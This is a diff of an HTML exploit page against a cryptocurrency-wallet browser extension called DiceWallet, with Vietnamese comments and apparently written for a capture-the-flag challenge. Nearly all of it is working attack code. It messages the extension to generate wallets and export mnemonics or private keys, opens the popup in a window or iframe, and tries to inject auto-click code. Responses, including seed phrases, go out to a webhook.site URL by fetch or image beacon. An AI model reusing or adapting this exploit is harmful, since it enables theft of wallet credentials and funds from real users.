@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DiceWallet Exploit - Popup Method</title>
+    <title>DiceWallet Exploit - Trigger Wallet Generation</title>
 </head>
 <body>
     <h1>DiceWallet Exploit</h1>
@@ -9,100 +9,107 @@
     
     <script>
         const WEBHOOK_URL = 'https://a01e28d1-26bd-4236-b3de-72d0a426ca16.webhook.site';
+        const EXTENSION_ID = '21b5b501-df4f-40e1-b698-e392f9fcbe7a';
         
         function log(msg) {
             document.getElementById('status').innerHTML += '<br>' + msg;
             console.log(msg);
         }
         
-        async function exploit() {
-            log('1. Looking for extension ID...');
+        function sendToWebhook(data) {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(() => {
+                new Image().src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(data))}`;
+            });
+        }
+        
+        async function triggerWalletGeneration() {
+            log('1. Attempting to trigger wallet generation...');
             
-            // Tìm extension ID
-            const scripts = document.getElementsByTagName('script');
-            let extensionId = null;
-            let extensionUrl = null;
-            
-            for (let script of scripts) {
-                const src = script.src;
-                if (src && src.startsWith('moz-extension://')) {
-                    extensionUrl = src;
+            // CÁCH 1: Gửi message trực tiếp đến background
+            try {
+                log('Sending DICE_POPUP generate message...');
+                const response = await chrome.runtime.sendMessage(EXTENSION_ID, {
+                    type: 'DICE_POPUP',
+                    action: 'generate'
+                });
+                
+                log('✅ Generate response:', response);
+                sendToWebhook({
+                    type: 'generate_response',
+                    response
+                });
+                
+                // Nếu có mnemonic
+                if (response && response.mnemonic) {
+                    log('🎯 Got mnemonic:', response.mnemonic);
                     
-                    // CÁCH ĐÚNG: Dùng URL object để parse
-                    try {
-                        const url = new URL(src);
-                        extensionId = url.hostname; // Phần hostname chính là extension ID
-                        log(`✅ Found extension ID: ${extensionId}`);
-                        log(`✅ Full URL: ${src}`);
-                    } catch (e) {
-                        log(`❌ Error parsing URL: ${e.message}`);
-                        // Fallback: dùng split đúng index
-                        const parts = src.split('/');
-                        extensionId = parts[2]; // Index 2 là extension ID
-                        log(`✅ Found extension (fallback): ${extensionId}`);
-                    }
-                    break;
-                }
-            }
-            
-            if (!extensionId) {
-                log('❌ No extension found');
-                return;
-            }
-            
-            // Gửi extension ID về webhook
-            log(`📤 Sending extension ID to webhook: ${extensionId}`);
-            fetch(`${WEBHOOK_URL}?extensionId=${extensionId}`);
-            
-            log('2. Setting up message listener...');
-            
-            // Lắng nghe messages từ popup
-            window.addEventListener('message', (e) => {
-                if (e.data && (e.data.type === 'DICE_RESPONSE' || e.data.type === 'DICE_ERROR')) {
-                    log('📨 Received message from popup:', e.data);
-                    
-                    // Gửi về webhook
-                    fetch(WEBHOOK_URL, {
+                    // Gửi flag
+                    const flagRes = await fetch('/flag', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            type: 'popup_message',
-                            data: e.data
-                        })
+                        body: JSON.stringify({ mnemonic: response.mnemonic })
                     });
                     
-                    // Nếu có mnemonic hoặc private key
-                    if (e.data.result && (e.data.result.mnemonic || e.data.result.privateKey)) {
-                        log('🎯 Found credentials!');
-                        
-                        // Thử gửi flag
-                        const mnemonic = e.data.result.mnemonic || e.data.result.privateKey;
-                        fetch('/flag', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ mnemonic })
-                        }).then(r => r.json()).then(data => {
-                            if (data.flag) {
-                                log(`🏁 FLAG: ${data.flag}`);
-                            }
-                        });
+                    const flagData = await flagRes.json();
+                    if (flagData.flag) {
+                        log(`🏁 FLAG: ${flagData.flag}`);
                     }
                 }
-            });
+                
+            } catch (e) {
+                log('❌ Generate failed:', e.message);
+            }
             
-            log('3. Opening popup.html...');
+            // CÁCH 2: Thử action addAccount
+            try {
+                log('Sending DICE_POPUP addAccount message...');
+                const response = await chrome.runtime.sendMessage(EXTENSION_ID, {
+                    type: 'DICE_POPUP',
+                    action: 'addAccount'
+                });
+                
+                log('✅ addAccount response:', response);
+                sendToWebhook({
+                    type: 'addAccount_response',
+                    response
+                });
+                
+            } catch (e) {
+                log('❌ addAccount failed:', e.message);
+            }
             
-            // Mở popup
-            const popupUrl = `moz-extension://${extensionId}/popup.html`;
-            log(`Popup URL: ${popupUrl}`);
+            // CÁCH 3: Thử qua window.ethereum
+            if (window.ethereum) {
+                try {
+                    log('Calling wallet_generate via ethereum...');
+                    const result = await window.ethereum.request({
+                        method: 'wallet_generate'
+                    });
+                    
+                    log('✅ wallet_generate:', result);
+                    sendToWebhook({
+                        type: 'wallet_generate',
+                        result
+                    });
+                    
+                } catch (e) {
+                    log('❌ wallet_generate failed:', e.message);
+                }
+            }
             
+            // CÁCH 4: Mở popup và tự động click
+            log('2. Opening popup to trigger manually...');
+            
+            const popupUrl = `moz-extension://${EXTENSION_ID}/popup.html#/onboard`;
             const popup = window.open(popupUrl, '_blank', 'width=400,height=600');
             
             if (!popup) {
-                log('❌ Cannot open popup - blocked by browser');
-                
-                // Thử cách khác: tạo iframe
-                log('Trying iframe instead...');
+                log('Popup blocked - trying iframe');
                 const iframe = document.createElement('iframe');
                 iframe.src = popupUrl;
                 iframe.style.width = '400px';
@@ -111,103 +118,34 @@
                 iframe.style.top = '10px';
                 iframe.style.right = '10px';
                 iframe.style.zIndex = '9999';
-                iframe.style.border = '4px solid black';
                 document.body.appendChild(iframe);
-                
-                log('Iframe added - check if messages appear');
             }
             
-            log('4. Waiting for messages from popup...');
-            
-            // Thử gửi message đến background script
-            try {
-                log('Attempting to send message to background...');
-                const response = await chrome.runtime.sendMessage(extensionId, {
+            // CÁCH 5: Inject script vào popup nếu có thể
+            setTimeout(() => {
+                log('3. Attempting to auto-click in popup...');
+                
+                // Gửi message đến tất cả các tab
+                chrome.runtime.sendMessage(EXTENSION_ID, {
                     type: 'DICE_POPUP',
-                    action: 'getState'
+                    action: 'inject',
+                    code: `
+                        // Tự động click nút Create New Wallet
+                        setTimeout(() => {
+                            const btn = document.getElementById('btn-generate');
+                            if (btn) {
+                                btn.click();
+                                console.log('Clicked generate button!');
+                            }
+                        }, 2000);
+                    `
                 });
-                log('Background response:', response);
-                
-                // Gửi response về webhook
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        type: 'background_response',
-                        response
-                    })
-                });
-                
-            } catch (e) {
-                log('Cannot send to background:', e.message);
-            }
-            
-            // Thử gọi các methods qua window.ethereum
-            if (window.ethereum) {
-                log('5. Testing wallet methods...');
-                
-                // Thử wallet_getState trước
-                try {
-                    const state = await window.ethereum.request({
-                        method: 'wallet_getState'
-                    });
-                    log('wallet_getState:', state);
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            type: 'wallet_state',
-                            state
-                        })
-                    });
-                } catch (e) {
-                    log('wallet_getState error:', e.message);
-                }
-                
-                // Thử wallet_exportMnemonic
-                try {
-                    const result = await window.ethereum.request({
-                        method: 'wallet_exportMnemonic'
-                    });
-                    log('wallet_exportMnemonic:', result);
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            type: 'wallet_export',
-                            method: 'mnemonic',
-                            result
-                        })
-                    });
-                } catch (e) {
-                    log('wallet_exportMnemonic error:', e.message);
-                }
-                
-                // Thử wallet_exportPrivateKey
-                try {
-                    const result = await window.ethereum.request({
-                        method: 'wallet_exportPrivateKey'
-                    });
-                    log('wallet_exportPrivateKey:', result);
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            type: 'wallet_export',
-                            method: 'privateKey',
-                            result
-                        })
-                    });
-                } catch (e) {
-                    log('wallet_exportPrivateKey error:', e.message);
-                }
-            }
-            
-            log('=== Exploit running - check webhook ===');
+            }, 3000);
         }
         
         // Start
-        exploit();
+        log('0. Starting exploit...');
+        triggerWalletGeneration();
     </script>
 </body>
 </html>
